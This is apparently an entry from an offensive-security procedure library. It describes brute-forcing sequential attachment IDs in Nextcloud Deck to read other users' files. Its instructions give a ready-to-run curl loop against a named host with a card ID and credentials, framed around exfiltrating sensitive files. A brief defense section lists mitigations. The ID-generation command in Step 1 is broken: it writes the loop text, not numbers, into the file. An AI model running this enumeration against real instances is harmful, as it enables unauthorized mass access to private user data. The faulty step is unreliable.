---
id: p3b2c3d4-e5f6-7890-abcd-ef1234567893
tags:
  - brute-force
  - enumeration
  - low-entropy
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-enumerate-ids]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Brute Force]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:29:28.656Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Account Discovery]]'
---
# Brute-Force-Attachment-IDs-for-Enumeration

## Summary

This procedure enumerates attachments across users by brute-forcing sequential numeric IDs in the Nextcloud Deck URL, exploiting predictable ID assignment for mass discovery.

## Description

Attachment IDs are incremental integers starting from low numbers (e.g., 1, 2, 3), allowing attackers to iterate through possible values in the URL format /apps/deck/cards/{card_id}/attachment/{id}. Each valid ID reveals a file from any user on the instance, enabling comprehensive data leakage without authentication beyond basic login.

## Requirements

1. Known card ID from a task.
2. Authenticated session (any user).
3. Scriptable tool like curl or browser automation for iteration.

## Defense

Defensive measures and detection strategies:

- Assign random, high-entropy IDs (e.g., UUIDv4) to attachments.
- Rate-limit requests to attachment endpoints.
- Detect sequential ID probing via access logs.

## Objectives

1. Discover attachments from all users on the instance.
2. Exfiltrate multiple sensitive files.
3. Scale the IDOR for broader impact.

## Instructions

### Step 1: Prepare ID List

**Context**: Generate a range of possible attachment IDs based on instance size (e.g., 1-1000).

Create a file with IDs: echo "for i in {1..1000}; do echo $i; done" > ids.txt

**Expected Output**: Text file with sequential numbers.

### Step 2: Iterate and Fetch

**Context**: Loop through IDs, requesting each URL and checking for success.

Use curl in a loop to test each ID with the known card:

Execute [[commands/curl-enumerate-ids]] to probe:

```bash
for id in $(cat ids.txt); do
  curl -s -u "UserB:password" -w "%{http_code} %{url_effective}\n" "https://us.cloudamo.com/apps/deck/cards/8420/attachment/$id" | grep -v 404;
done
```

> Valid IDs return 200; save successful responses to files for review.

**Expected Output**: List of accessible attachments with 200 responses.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Brute Force]] Brute Force
- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/curl-enumerate-ids]]

## Tools Used


## Tags

- brute-force
- enumeration
